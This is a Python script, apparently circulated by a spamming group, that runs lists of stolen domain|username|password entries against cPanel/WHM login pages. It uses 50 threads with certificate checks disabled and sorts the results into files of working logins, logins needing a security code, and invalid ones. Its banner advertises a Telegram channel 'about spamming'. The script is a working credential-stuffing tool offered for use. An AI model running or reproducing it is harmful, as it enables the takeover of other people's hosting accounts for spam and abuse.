import os
import sys
import concurrent.futures
import colorama
import requests
from colorama import Fore, Style
import threading
import urllib3
import chardet

# Suppressing urllib3 warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

colorama.init(autoreset=True)

# Define colors for success and failure messages
g = Fore.GREEN
r = Fore.RED
b = Fore.BLUE
c = Fore.CYAN
y = Fore.YELLOW
m = Fore.MAGENTA

# Initializing a lock for thread-safe printing and file writing
lock = threading.Lock()

def ensure_dir(directory):
    """Ensure that a directory exists; if not, create it."""
    if not os.path.exists(directory):
        os.makedirs(directory)

# Make sure the Results directory exists
ensure_dir('Results')

def print_colored(message, color):
    print(color + message)

def whmcheck(url):
    try:
        domain, username, pwd = url.split("|")
        # Adjusting for WHM's SSL port
        host = domain + "/login/?login_only=1"
        host = host.replace("http://", "https://").replace(":2086", ":2087")
        log = {'user': username, 'pass': pwd}
        req = requests.post(host, data=log, timeout=15, verify=False)

        if 'security_token' in req.text:
            with lock:
                if 'Enter the security code for' in req.text:
                    print(f"{g}[+]{c} {url}  ==> {g}WHM Login with Security Code {c}Successful! {m}@rrustemHEKRI_V2")
                    with open('Results/whm_security_code.txt', 'a', encoding='utf-8') as f:
                        f.write(url + "\n")
                else:
                    print(f"{g}[+]{c} {url}  ==> {g}WHM Login {c}Successful! {m}@rrustemHEKRI_V2")
                    with open('Results/whm_good.txt', 'a', encoding='utf-8') as f:
                        f.write(url + "\n")
        else:
            with lock:
                print(f"{r}[+]{r} {url}  ==> {r}WHM Login {r}Invalid! {y}@rrustemHEKRI_V2")
                with open('Results/whm_invalid.txt', 'a', encoding='utf-8') as f: # Corrected file name for consistency
                    f.write(url + "\n")
    except Exception as e:
        with lock:
            print_colored(f"{r}[+] {url}  ==> WHM Host Invalid", r)

def detect_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read(100000)
    result = chardet.detect(raw_data)
    return result['encoding']

def menu():
    banner_part1 = Fore.BLUE + """


    ██╗    ██╗██╗  ██╗███╗   ███╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗
    ██║    ██║██║  ██║████╗ ████║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║ █╗ ██║███████║██╔████╔██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
    ██║███╗██║██╔══██║██║╚██╔╝██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║  ██║██║ ╚═╝ ██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝



    """

    banner_part2 = Fore.MAGENTA + """
    For more tools and info about spamming,
    join my Telegram channel: @rrustemHEKRI_V2

    For direct contact and inquiries,
    reach out to the owner Telegram: @rrustemHEKRI
    """

    # Printing the entire banner with color separation
    print(banner_part1 + banner_part2)

    try:
        file_path = input(f"{b}Provide Your List --> ")
        encoding = detect_encoding(file_path)
        with open(file_path, 'rt', encoding=encoding) as f:  # Use detected encoding
            url_list = f.read().splitlines()
        with concurrent.futures.ThreadPoolExecutor(50) as executor:
            executor.map(whmcheck, url_list)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        sys.exit(0)
